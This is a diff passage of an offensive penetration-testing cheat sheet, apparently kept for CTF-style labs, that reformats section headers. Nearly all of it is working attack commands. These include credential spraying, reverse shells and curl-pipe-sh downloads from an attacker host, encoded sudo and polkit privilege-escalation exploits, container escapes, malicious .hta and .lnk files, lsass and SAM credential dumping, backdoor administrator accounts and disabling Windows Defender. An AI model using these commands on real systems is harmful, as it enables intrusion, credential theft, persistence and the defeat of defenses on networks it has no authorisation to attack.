 hydra -I mysql://$TARGET -L /tmp/mysqlusernames -P /tmp/mysqlpasswords -e n -t15 2>/dev/null
 
-+---------- Executing Queries ----------+
+[###] Executing Queries
 mysql -h localhost -u root --skip-ssl -p'root' -e 'show databases;'
 mysql -h localhost -u $USERNAME --skip-ssl -p'$PASSWORD' -e 'show databases;'
 mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name,column_name FROM information_schema.columns" | grep 'passw'
@@ -1028,10 +1028,10 @@ mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT @@version, @
 mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT LOAD_FILE('/etc/passwd')\G;"
 
 [*] (3389) RDP
-+---------- Spray Service ----------+
+[###] Spray Service
 (hydra -I rdp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
-+---------- Login to Service ----------+
+[###] Login to Service
 xfreerdp3 /v:'$TARGET' /d:'' /u:'' /p:'' /cert:ignore /sec:nla /tls:seclevel:0 +auto-reconnect +clipboard +drive:Downloads,"/Upload"
 xfreerdp3 /v:'$TARGET' /d:'$DOM' /u:'$USERNAME' /p:'$PASSWORD' /cert:ignore /sec:nla /tls:seclevel:0 +auto-reconnect +clipboard +drive:Downloads,"/Upload"
 
@@ -1086,29 +1086,29 @@ impacket-atexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
 # Post-Exploitation 
 ## Linux
 [*] Initial Shell
-+---------- Web Delivery (Linux Meterpreter) ----------+
+[###] Web Delivery (Linux Meterpreter)
 msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SRVPORT 8888; setg LHOST $MYIP; setg LPORT 443; set TARGET Linux; setg PAYLOAD linux/x64/meterpreter/reverse_tcp; run'
 
-+---------- Resh: Generate ----------+
+[###] Resh: Generate
 resh.py $MYIP 80 /Upload/resh; resh.py $MYIP 80 /Upload/resh_5566
 
-+---------- Resh: Execute ----------+
+[###] Resh: Execute
 curl -s http://$MYIP:53/resh | sh
 wget -qO- http://$MYIP:53/resh | sh
 
-+---------- Base64 Shell ----------+
+[###] Base64 Shell
 echo 'bash -i >& /dev/tcp/10.10.16.9/5555 0>&1' | base64
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzU1NTUgMD4mMQo=
 
 echo 'sh -i >& /dev/tcp/10.10.16.9/5555 0>&1' | base64
 c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOS81NTU1IDA+JjEK
 
-+---------- Upgrade TTY ----------+
+[###] Upgrade TTY
 script /dev/null -c bash
 python3 -c 'import pty; pty.spawn("/bin/bash")';
 CTRL-Z; stty size; stty raw -echo; fg; export SHELL=bash; export TERM=xterm-256color; stty rows <num> columns <num>; reset
 
-+---------- Set Custom PATH ----------+
+[###] Set Custom PATH
 export PATH=/dev/shm:$PATH
 
 [*] File Transfer
@@ -1118,31 +1118,31 @@ wget -qO- $MYIP/linux/linpeas.sh -O linpeas.sh
 scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 139 -d /Upload
 
 [*] Privilege Escalation
-+---------- Priv Check ----------+
+[###] Priv Check
 curl -s $MYIP/whoami.sh | sh
 curl -s $MYIP/linux/linpeas.sh | sh
 
-+---------- Check For Pivots ----------+
+[###] Check For Pivots
 arp -a
 
-+---------- Creds In DB Files ----------+
+[###] Creds In DB Files
 grep -IrinE "db[-_]?(user|pass|login)\w*" / 2>/dev/null
 
-+---------- SUDO Exploits ----------+
+[###] SUDO Exploits
 -->> 1.9.14 – 1.9.17  (CVE-2025-32463 chwoot)
 echo 'WD0kKG1rdGVtcCAtZCAvdG1wL1hYWFhYWCkKY2QgJHtYP30gfHwgZXhpdCAxCmNhdCA+IFguYzw8RU9GCiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgpfX2F0dHJpYnV0ZV9fKChjb25zdHJ1Y3RvcikpIHZvaWQgWCh2b2lkKSB7CiAgc2V0cmV1aWQoMCwwKTsKICBzZXRyZWdpZCgwLDApOwogIGNoZGlyKCIvIik7CiAgZXhlY2woIi9iaW4vYmFzaCIsICIvYmluL2Jhc2giLCBOVUxMKTsKfQpFT0YKbWtkaXIgLXAgWC9ldGMgbGlibnNzXwplY2hvICJwYXNzd2Q6IC9YIiA+IFgvZXRjL25zc3dpdGNoLmNvbmYKY3AgL2V0Yy9ncm91cCBYL2V0YwpnY2MgLXNoYXJlZCAtZlBJQyAtV2wsLWluaXQsWCAtbyBsaWJuc3NfL1guc28uMiBYLmMKc3VkbyAtUiBYIFgKcm0gLXJmICR7WD99Cg==' | base64 -d > /tmp/root.sh; chmod +x /tmp/root.sh; /tmp/root.sh
 
-+---------- Symlink: Writeable Root File ----------+
+[###] Symlink: Writeable Root File
 ln -sf /etc/passwd /var/log/below/error_root.log
 
-+---------- Chrome Debugging ----------+
+[###] Chrome Debugging
 curl -sg http://240.0.0.1:41829/json
 echo 'Target.createTarget {"url":"file:///root/.ssh/id_rsa"}' | websocat -n1 --jsonrpc --jsonrpc-omit-jsonrpc 'ws://240.0.0.1:41829/devtools/page/0DC707C3C63E0C0E7B012B8AE0597CC0'
 curl -sg http://240.0.0.1:41829/json
 echo 'Page.printToPDF {}\n' | websocat -n1 --jsonrpc --jsonrpc-omit-jsonrpc 'ws://240.0.0.1:41829/devtools/page/BEAA157A683895274AA8D0BD21B80D0E' | jq -r '.result.data' | base64 -d > output.pdf
 sudo update-binfmts --disable cli; open output.pdf
 
-+---------- PATH Hijack (SUID) ----------+
+[###] PATH Hijack (SUID)
 -->> Create Imposter Binary from Victim Machine (/tmp/x)
 echo '#include<stdlib.h>\nint main(){system("cp /bin/bash /tmp/bashx;chown root:root /tmp/bashx;chmod u+s /tmp/bashx");}' | sed 's/\\n/\n/g' > /tmp/x.c; gcc /tmp/x.c -o /tmp/x; rm /tmp/x.c
 
@@ -1159,10 +1159,10 @@ sysinfo; /tmp/bashx -p
 -->> Hijacked Imposter Produces SUID Bash
 /tmp/bashx -p
 
-+---------- Polkit (CVE-2021-4034) ----------+
+[###] Polkit (CVE-2021-4034)
 echo $'F=-Wall\n\nT=$(shell which true)\n\n.PHONY: all\nall: m.so run gconv-modules gconvpath\n\n.PHONY: clean\nclean:\n\trm -rf m.so run gconv-modules GCONV_PATH=./\n\ngconv-modules:\n\techo "module UTF-8// PWN// m 1" > $@\n\n.PHONY: gconvpath\ngconvpath:\n\tmkdir -p GCONV_PATH=.\n\tcp $(T) GCONV_PATH=./m.so:.\n\nm.so: m.c\n\t$(CC) $(F) --shared -fPIC -o $@ $<\n' >Makefile; echo $'#include <unistd.h>\nint main(){char * const e[]={"m.so:.","PATH=GCONV_PATH=.","SHELL=/x","CHARSET=PWN",NULL};return execve("/usr/bin/pkexec",NULL,e);}' >run.c; echo $'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid gconv(){}\nvoid gconv_init(void *p){char * const a[]={"/bin/sh",NULL};char * const e[]={"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",NULL};setuid(0);setgid(0);execve(a[0],a,e);exit(0);}' >m.c; make; ./run; rm gconv-modules Makefile m.c m.so run run.c; rm -rf GCONV_PATH=.
 
-+---------- Groups ----------+
+[###] Groups
 newgrp developer
 find / -group developer 2>/dev/null
 
@@ -1170,7 +1170,7 @@ newgrp adm
 aureport --tty
 echo "6D7262336E5F41634064336D79210A" | xxd -r -p
 
-+---------- Malicious Files ----------+
+[###] Malicious Files
 -->> .js
 echo -e 'const { exec } = require('child_process');\nexec('curl $MYIP:53/resh_5566|sh', (err, stdout, stderr) => {});
 
@@ -1183,78 +1183,78 @@ echo -e 'url = "http://$MYIP:53/ssh.pub"\noutput = "/root/.ssh/authorized_keys"'
 curl -s -K /tmp/cmd
 ssh -i ~/.ssh/ssh.key root@$TARGET
 
-+---------- Symlink: Doubled ----------+
+[###] Symlink: Doubled
 ln -s /root/.ssh/id_rsa /home/bob/.cache/x; ln -s /home/bob/.cache/x /home/bob/.cache/x.png
 CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/.cache/x.png
 
-+---------- Write: /etc/passwd ----------+
+[###] Write: /etc/passwd
 echo "any:$(openssl passwd -1 root):0:0:root:/root:/bin/bash" >> /etc/passwd && echo 'The password is: root'; su any
 
-+---------- Nginx: sudo ----------+
+[###] Nginx: sudo
 echo -e 'user root;\nevents{\nworker_connections 1024;\n}\nhttp{\nserver{\nlisten 9999;\nroot /;\nautoindex on;\ndav_methods PUT;\n}\n}' >/tmp/nginx.conf
 (sudo /usr/sbin/nginx -c /tmp/nginx.conf &)
 curl localhost:9999/etc/shadow
 curl -X PUT localhost:9999/root/.ssh/authorized_keys -d 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIeeFWbnFWdAvY9w58uDcXbGb59vTldv4LnEkVgifJ7'
 
-+---------- 7z Wildcard ----------+
+[###] 7z Wildcard
 touch @x; ln -fs /root/.ssh/id_rsa x
 sudo 7z_backup_script
 
-+---------- Image Magick (CVE-2024-41817) ----------+
+[###] Image Magick (CVE-2024-41817)
 cd /opt/app/static/assets/images/
 gcc -x c -shared -fPIC -o ./libxcb.so.1 - <<< $'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n__attribute__((constructor)) void init(){system("chmod u+s /bin/bash");exit(0);}'; bash -p
 
-+---------- Mosh-Server / Client ----------+
+[###] Mosh-Server / Client
 sudo /usr/bin/mosh-server new -i 0.0.0.0 -p 164
 MOSH CONNECT 164 llf0eFMPgMD7yZw7zgfkLw
 MOSH_KEY=llf0eFMPgMD7yZw7zgfkLw mosh-client 0.0.0.0 164
 
-+---------- Wi-fi (WPA) ----------+
+[###] Wi-fi (WPA)
 iw dev
 reaver -i mon0 -b 02:00:00:00:00:00 -vv
 
-+---------- Gnuplot ----------+
+[###] Gnuplot
 echo 'system("curl $MYIP:53/resh|sh")' > /opt/gnuplot/x.plt
 
-+---------- Polkit Version ----------+
+[###] Polkit Version
 rpm -qa | grep -i polkit | grep -i "0.11[3-9]"
 apt list --installed 2>/dev/null | grep -i policykit
 
-+---------- Port Scan Gateway ----------+
+[###] Port Scan Gateway
 curl -s $MYIP:53/linux/nmap | sh
 
-+---------- Bash SUID Exploits ----------+
+[###] Bash SUID Exploits
 f=/tmp/bash;cp /bin/bash $f;chmod u+s $f
 f=x;echo -e '#!/bin/bash\ncp /bin/bash /tmp\nchmod u+s /tmp/bash'>$f;chmod +x $f
 
-+---------- Exploits ----------+
+[###] Exploits
 snapd_2.37          https://www.exploit-db.com/exploits/46361
 sudo_1.6.9.p18      https://www.exploit-db.com/exploits/7129
 polkit_0.117-2      https://www.exploit-db.com/exploits/50011
 
-+---------- SSH Files ----------+
+[###] SSH Files
 cd ~/.ssh; ls -la
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze<REDACTED>' > ~/.ssh/authorized_keys
 
-+---------- Config Files ----------+
+[###] Config Files
 grep -r -E 'conf' /var/www
 
-+---------- /etc/passwd Permission ----------+
+[###] /etc/passwd Permission
 ls -la /etc/passwd
 nano /etc/passwd
 mkpasswd -m descrypt 'password'
 piS1wHGBkJ3z2
 root:piS1wHGBkJ3z2:0:0:root:/root:/usr/bin/bash
 
-+---------- Switching Users ----------+
+[###] Switching Users
 su root -p
 password
 
-+---------- Finding Files ----------+
+[###] Finding Files
 find / -name '*secret0*' -readable 2>/dev/null | xargs ls -la
 find / -name 'root.txt' -readable -exec echo {} \; -exec cat {} \; 2>/dev/null
 
-+---------- /etc/shadow ----------+
+[###] /etc/shadow
 cat /etc/shadow
 
 [*] Meterpreter
@@ -1263,7 +1263,7 @@ msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg
 msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/reverse_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run;'
 
 [*] Containers
-+---------- Docker ----------+
+[###] Docker
 curl -s --unix-socket /var/run/docker.sock http:/./images/json
 curl -s --unix-socket /var/run/docker.sock http:/./containers/json
 curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http:/./containers/create -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"staging:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "curl $MYIP/resh|sh"]}'
@@ -1282,34 +1282,34 @@ docker ps -a
 docker commit 35c090009763 tempimg
 docker run -v /:/mnt --rm --privileged -it tempimg chroot /mnt sh
 
-+---------- Run Image Privileged ----------+
+[###] Run Image Privileged
 docker image list
 docker run -v /:/mnt --rm --privileged REPOSITORY chroot /mnt bash -c 'curl 10.10.16.9:139/resh|sh'
 
-+---------- Privileged: True ----------+
+[###] Privileged: True
 cat docker-compose.yml | grep 'privileged: true'
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`;mkdir -p $d/w;echo 1 >$d/w/notify_on_release;t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`;echo $t/c >$d/release_agent;printf '#!/bin/sh\ncurl 10.10.16.9/resh | sh' >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";
 
 ## Windows
 [*] Initial Shell
-+---------- Web Delivery (PowerShell) ----------+
+[###] Web Delivery (PowerShell)
 msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SRVPORT 8888; setg LHOST $MYIP; setg LPORT 443; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
 
-+---------- Resh ----------+
+[###] Resh
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/resh.ps1');resh -Reverse $MYIP -Port 5555"
 \\$MYIP\$\nc.exe $MYIP 80 -e cmd
 
-+---------- Host Malicious .hta + AMSI Web Delivery ----------+
+[###] Host Malicious .hta + AMSI Web Delivery
 python3 -m http.server 80 /Upload
 echo '<!DOCTYPE html>\n<html>\n<head>\n<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no"/>\n<script language="VBScript">\nFunction X()\nDim XX\nSet XX = CreateObject("Wscript.Shell")\nXX.run "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGU<PAYLOAD_HERE>.......", 0, true\nEnd Function\nX\nself.close\n</script>\n</head>\n<body>\n</body>\n</html>' > /Upload/x.hta
 
 [*] File Transfer
-+---------- Serve ----------+
+[###] Serve
 fileserve -d /Upload
 python3 -m http.server 80 /Upload
 impacket-smbserver share /Upload/windows
 
-+---------- Transfer: From Linux to Windows ----------+
+[###] Transfer: From Linux to Windows
 curl $MYIP/windows/nc.exe -o \windows\tasks\nc.exe
 curl $MYIP/windows/mimikatz.exe -o \windows\tasks\mimikatz.exe
 curl $MYIP/windows/Rubeus.exe -o \windows\tasks\Rubeus.exe
@@ -1320,27 +1320,27 @@ curl $MYIP/bat2exe.bat -o \windows\tasks\bat2exe.bat
 copy \\$MYIP\$\nc.exe \programdata
 certutil -urlcache -f http://$MYIP/windows/nc.exe \windows\tasks\nc.exe
 
-+---------- Transfer: To Linux from Windows ----------+
+[###] Transfer: To Linux from Windows
 curl $MYIP/windows/nc.exe -o \windows\tasks\nc.exe
 \windows\tasks\nc.exe $MYIP 80 < \windows\tasks\BloodHound.zip
 rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
 
 [*] Persistence
-+---------- Create Account ----------+
+[###] Create Account
 powershell -c "Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }"
 
-+---------- Verify Access ----------+
+[###] Verify Access
 sprayme 'dbf:123qweasdF!' hosts
 
 [*] Privilege Escalation
-+---------- Priv Check ----------+
+[###] Priv Check
 powershell -c "curl $MYIP/windows/winPEASofs.exe -o \windows\tasks\winPEASofs.exe; \windows\tasks\winPEASofs.exe"
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/PrivescCheck.ps1');Invoke-PrivescCheck
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/whoami')
 //$MYIP/$/winPEASofs.exe > //$MYIP/$/output_winPEAS.txt
 tail -f /Upload/windows/output_winPEAS.txt
 
-+---------- Sharphound Data ----------+
+[###] Sharphound Data
 curl $MYIP/windows/Sharphound.exe -o \windows\tasks\Sharphound.exe; \windows\tasks\Sharphound.exe
 curl $MYIP/windows/nc.exe -o \windows\tasks\nc.exe
 \windows\tasks\nc.exe $MYIP 80 < \windows\tasks\BloodHound.zip
@@ -1348,28 +1348,28 @@ rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
 cat /Upload/bloodhound/*_users.json | jq -r '.. | .samaccountname? // empty' | tee usernames_$DC
 cat /Upload/bloodhound/*_computers.json | jq -r '.. | .samaccountname? // empty' | tee computers_$DC
 
-+---------- Identify Hosts from Computers ----------+
+[###] Identify Hosts from Computers
 sort -u computers_$DC | sed 's/\$$//' | paste -sd, - | sed 's/^/@("/;s/,/","/g;s/$/") | ForEach-Object { $comp=$_; Resolve-DnsName $_ -Type A -ErrorAction SilentlyContinue | Select-Object @{Name=\"Name\";Expression={$comp}},IPAddress } | Format-Table -AutoSize/'
 
-+---------- Switch User: Known Creds ----------+
+[###] Switch User: Known Creds
 //$MYIP/$/RunasCs.exe --bypass-uac --logon-type 8 $USERNAME $PASSWORD cmd.exe -r $MYIP:8443
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/Invoke-RunasCs.ps1'); Invoke-RunasCs -Username $USERNAME -Password $PASSWORD -Command cmd.exe -Remote $MYIP:8443
 
-+---------- Restore AD Objects ----------+
+[###] Restore AD Objects
 powershell -c "Restore-ADObject -Identity 'GUID or DistinguishedName'"
 
-+---------- CanPSRemote (AdminTo) ----------+
+[###] CanPSRemote (AdminTo)
 Invoke-Command -ComputerName SRV01 -ScriptBlock { whoami /priv; arp /a; ipconfig /all }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { New-SmbShare -Name tasks -Path "C:\Windows\Tasks" -FullAccess dbf; Add-MpPreference -ExclusionPath "C:\Windows\Tasks"; Set-MpPreference -DisableRealtimeMonitoring $true }
 
-+---------- LAPS ----------+
+[###] LAPS
 impacket-GetLAPSPassword -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD' | awk '$1 ~ /\$$/ {print $1 " --> Administrator:" $3}'
 $computer='WS02'; $pass='YwBxQ1hv'; Set-Item WSMan:\localhost\Client\TrustedHosts -Value $computer -Force -Confirm:$false; $sec=ConvertTo-SecureString $pass -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("$computer\Administrator",$sec); Invoke-Command -ComputerName $computer -Credential $cred -Authentication Negotiate -ScriptBlock { whoami /priv; arp /a; ipconfig /all }
 Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
 Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { New-SmbShare -Name tasks -Path "C:\Windows\Tasks" -FullAccess dbf; Add-MpPreference -ExclusionPath "C:\Windows\Tasks"; Set-MpPreference -DisableRealtimeMonitoring $true }
 
-+---------- DPAPI ----------+
+[###] DPAPI
 mkdir dpapi
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/dpapi.ps1')
 download ...\S-1-5...\7dc6a492-36e2-4c2d-be66-ba29d263dda2 dpapi/
@@ -1381,17 +1381,17 @@ dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE
 dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /password:$PASSWORD /protected
 dpapi::cred /masterkey:<MASTER_KEY> /in:"...\<USER>\...\...\Microsoft\Credentials\<ENCRYPTED_FILE>"
 
-+---------- SeBackupPrivilege ----------+
+[###] SeBackupPrivilege
 $a = [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$MYIP:53/windows/SeBackupPrivilegeUtils.dll')); Get-ChildItem C:\Users -Recurse -File -Include user.txt,root.txt | ForEach-Object {$d=Join-Path $env:TEMP "$([guid]::NewGuid()).txt"; [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils]::CopyFile($_.FullName,$d,[ref]$true,$true)>$null; Get-Content $d; Remove-Item $d -Force}
 robocopy /b \users\administrator\desktop\ .; type \users\administrator\desktop\root.txt
 $a.GetExportedTypes() | ForEach-Object { $_.FullName }
 [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils].GetMethods() | ft Name, IsStatic, ReturnType
 
-+---------- SeImpersonatePrivilege ----------+
+[###] SeImpersonatePrivilege
 curl $MYIP/windows/EfsPotato.exe -o \windows\tasks\EfsPotato.exe
 \windows\tasks\EfsPotato.exe """powershell -c Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }"""
 
-+---------- SeDebugPrivilege ----------+
+[###] SeDebugPrivilege
 curl $MYIP/windows/procdump64.exe -o \windows\tasks\procdump.exe; \windows\tasks\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 curl $MYIP/windows/mimikatz.exe -o \windows\tasks\mimikatz.exe; \windows\tasks\mimikatz.exe
 sekurlsa::minidump lsass.dmp
@@ -1400,66 +1400,66 @@ vault::cred
 lsadump::sam
 lsadump::secrets
 
-+---------- DnsAdmins ----------+
+[###] DnsAdmins
 rlwrap nc -lvnp 80
 impacket-smbserver $ /Upload/windows
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=80 -f dll -o /Upload/windows/x.dll
 dnscmd.exe /config /serverlevelplugindll \\$MYIP\$\x.dll
 
-+---------- Dump Hashes ----------+
+[###] Dump Hashes
 powershell -c "net user dbf 123qweasdF! /add ; net localgroup Administrators dbf /add"
 nxc smb $TARGET -u 'dbf' -p '123qweasdF!' -M lsassy --local-auth
 nxc smb $TARGET -u 'dbf' -p '123qweasdF!' --sam --lsa --dpapi --local-auth
 impacket-secretsdump 'dbf':'123qweasdF!'@$TARGET
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --use-kcache --lsa --sam --dpapi --ntds --user Administrator
 
-+---------- Spray Hashes ----------+
+[###] Spray Hashes
 nxc winrm 192.168.110.51-56 -u usernames -H hashes --local-auth
 nxc smb 192.168.110.51-56 -u usernames -H hashes --local-auth --shares
 
-+---------- Malicious .lnk ----------+
+[###] Malicious .lnk
 curl $MYIP/windows/nc.exe -o \windows\tasks\nc.exe
 powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\windows\tasks\nc.exe'; $sc.Arguments = '$TARGET 5566 -e cmd.exe'; $sc.Save()"
 powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; $sc.Arguments = '\\$TARGET\\x'; $sc.Save()"
 
-+---------- Enumerate Certificate Services ----------+
+[###] Enumerate Certificate Services
 certutil -ADCA
 certutil -user
 certutil -CATemplates -config mist-DC01-CA
 certutil -Template User
 
-+---------- File Permissions ----------+
+[###] File Permissions
 icacls "flag.txt"
 icacls "flag.txt" /grant "Everyone:(F)"
 powershell -c "(Get-Acl 'C:\secret.txt').Access | Format-Table"
 takeown /f "C:\secret.txt" && icacls "C:\secret.txt" /grant %USERNAME%:F /inheritance:e
 
-+---------- Scheduled Tasks ----------+
+[###] Scheduled Tasks
 powershell -c "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task | Format-List *"
 powershell -c "Start-ScheduledTask -TaskName 'Ownership'"
 
 [*] Meterpreter
-+---------- Initial Shell ----------+
+[###] Initial Shell
 -->> Standard
 rlwrap msfconsole -q -x "use multi/handler; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; setg LHOST $MYIP; setg LPORT 4444; run"
 
 -->> Web Delivery
 msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; setg SRVPORT 8888; setg LHOST $MYIP; setg LPORT 80; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
 
-+---------- Stored Credentials ----------+
+[###] Stored Credentials
 run post/windows/gather/credentials/windows_autologin
 run post/windows/gather/credentials/gpp
 run post/windows/gather/enum_unattend
 run post/windows/gather/credentials/enum_cred_store
 
-+---------- Exploit Suggester ----------+
+[###] Exploit Suggester
 run multi/recon/local_exploit_suggester
 
-+---------- Load Modules ----------+
+[###] Load Modules
 load kiwi
 load powershell
 
-+---------- Initial Checks ----------+
+[###] Initial Checks
 powershell_execute "whoami /user /priv"
 powershell_execute "cd \users; tree /a /f"
 getsystem
@@ -1467,46 +1467,46 @@ sysinfo
 ps
 migrate
 
-+---------- Installed Apps ----------+
+[###] Installed Apps
 powershell_execute "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
 
-+---------- Services and Unquoted Paths ----------+
+[###] Services and Unquoted Paths
 powershell_execute "Get-Service | Where-Object { $_.CanStop -eq $true -and $_.DisplayName -notmatch 'Microsoft|Windows' } | Sort-Object DisplayName"
 powershell_execute "wmic service get name,displayname,pathname,startmode |findstr /i 'auto' |findstr /i /v 'c:\windows'"
 
-+---------- Scheduled Tasks ----------+
+[###] Scheduled Tasks
 powershell_execute "Get-ScheduledTask | Where-Object {($_.Author -notmatch 'Microsoft') -and ($_.TaskPath -notmatch 'Microsoft')} | Select-Object TaskName, TaskPath, State, Author"
 powershell_execute "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task; $filePath = $task.Actions.Execute; Get-Acl $filePath | Select-Object PSChildName, PSPath, AccessToString"
 powershell_execute "Start-ScheduledTask -TaskName 'Ownership'"
 
-+---------- PowerShell History ----------+
+[###] PowerShell History
 powershell_execute "type (Get-PSReadLineOption).HistorySavePath"
 
-+---------- Network Environment ----------+
+[###] Network Environment
 powershell_execute "powershell -c \"& { Get-NetTCPConnection -State Listen,Established | Where-Object { `$_."LocalAddress" -notin @('0.0.0.0','127.0.0.1') -and `$_."RemoteAddress" -notmatch '::' } | Sort-Object LocalAddress,LocalPort | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Format-Table -AutoSize }\""
 powershell_execute "arp -a"
 powershell_execute "arp -a -N 10.1.5.4"
 powershell_execute "route print"
 powershell_execute "ipconfig /all"
 
-+---------- Dumping ----------+
+[###] Dumping
 creds_all
 hashdump
 kiwi_cmd "lsadump::dcsync /domain:$DOM /all /csv"
 run post/windows/gather/smart_hashdump
 run post/windows/gather/lsa_secrets
 
-+---------- File Permissions ----------+
+[###] File Permissions
 powershell_execute "(Get-Acl 'C:\secret.txt').Access | Format-Table"
 powershell_execute "takeown /f 'C:\secret.txt' && icacls 'C:\secret.txt' /grant %USERNAME%:F /inheritance:e"
 
-+---------- Domain Environment ----------+
+[###] Domain Environment
 run post/windows/gather/enum_ad_users
 run post/windows/gather/enum_ad_computers
 run post/windows/gather/enum_domain
 run post/windows/gather/enum_domains
 
-+---------- Sessions and Jobs ----------+
+[###] Sessions and Jobs
 background
 sessions
 sessions -i 1
